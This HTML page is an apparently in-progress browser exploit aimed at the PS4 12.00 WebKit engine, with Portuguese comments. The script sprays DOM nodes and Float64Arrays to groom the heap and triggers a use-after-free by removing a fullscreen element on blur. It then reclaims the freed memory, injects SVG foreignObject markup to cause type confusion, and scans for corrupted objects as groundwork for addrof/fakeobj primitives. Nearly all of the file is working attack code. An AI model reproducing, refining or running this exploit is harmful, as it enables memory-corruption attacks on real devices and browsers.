<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF JSC Interleaved Feng Shui</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Type Confusion → Interleaved Heap Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 HEAP FENG SHUI INTERCALADO (O SEGREDO)
// Unimos o DOM Spray e o Heap Spray no mesmo loop para forçar a colisão
function setupInterleavedFengShui(){
    log("[*] Iniciando Interleaved Heap Spray...");

    window.dom_spray = [];
    window.heap_spray = [];
    window.obj_spray = [];

    for(let i=0; i<6000; i++){
        
        // 1. Alocação na WebCore (DOM)
        let t = document.createTextNode("TXT_" + i);
        document.body.appendChild(t);
        window.dom_spray.push(t);

        let d1 = document.createElement("div");
        d1.innerHTML = "EL_" + i;
        document.body.appendChild(d1);
        window.dom_spray.push(d1);

        let d2 = document.createElement("div");
        d2.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(d2);
        window.dom_spray.push(d2);

        // 2. Alocação no JSCore (FloatArray + Objects) COLADOS no DOM
        if(i < 5000){
            let f = new Float64Array(8);
            f[0] = i; // Nossa isca
            window.heap_spray.push(f);

            // Preparando o par para o futuro addrof/fakeobj
            window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
        }
    }

    log("[*] Spray Intercalado concluído!");
    log("[*] DOM: " + window.dom_spray.length + " | Float: " + window.heap_spray.length);
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 OVERLAP PROBE (SCANNER ATUALIZADO)
function domOverlapProbe(fsTarget){
    log("---- OVERLAP PROBE ----");

    try{
        let n = fsTarget.firstChild;

        if(!n){
            log("[!] no node");
            return;
        }

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 💣 WRITE PRIMITIVA (Mantida para varrer a memória adjacente)
            try{
                n.data = "A".repeat(0x200);
                log("[PWN] write expand OK");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCAN DUPLO: DOM e JSC HEAP
            try{
                // 1. SCAN DO DOM
                for(let i=0;i<window.dom_spray.length;i++){
                    let obj = window.dom_spray[i];
                    if(obj.nodeType === 3 && (!obj.data || !obj.data.includes("TXT_"))){
                        log("[!!!] TEXTNODE CORROMPIDO @ " + i);
                        return;
                    }
                    if(obj.nodeType === 1 && obj.innerHTML && obj.innerHTML.includes("AAAA")){
                        log("[!!!] ELEMENT OVERLAP @ " + i);
                        return;
                    }
                }
                log("[SCAN] nenhum overlap no DOM");

                // 2. SCAN DO FLOAT64ARRAY (JSC)
                for(let i=0; i<window.heap_spray.length; i++){
                    // Proteção extra: verifica se o tamanho do array foi corrompido primeiro (evita crash imediato)
                    if(window.heap_spray[i].length !== 8){
                        log("[$$$] JACKPOT! Float64Array LENGTH corrompido @ " + i);
                        return;
                    }
                    // Verifica se o valor "i" inicial foi sobrescrito pelos "A"s
                    if(window.heap_spray[i][0] !== i){
                        log("[$$$] JACKPOT! Float64Array VALOR corrompido @ " + i);
                        return;
                    }
                }
                log("[SCAN] Float64Array intacto");

            }catch(e){
                log("[UAF] scan crash");
            }

        } else {
            log("[INFO] nao virou TextNode");
        }

    }catch(e){
        log("[UAF] probe crash geral");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 160);
    setTimeout(()=>domOverlapProbe(fsTarget), 240);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ CRÍTICO
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN (AJUSTADO PARA O NOVO FENG SHUI)
function runTest(){
    log("[*] Iniciando teste");

    // Executa a nova alocação intercalada
    setupInterleavedFengShui(); 

    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
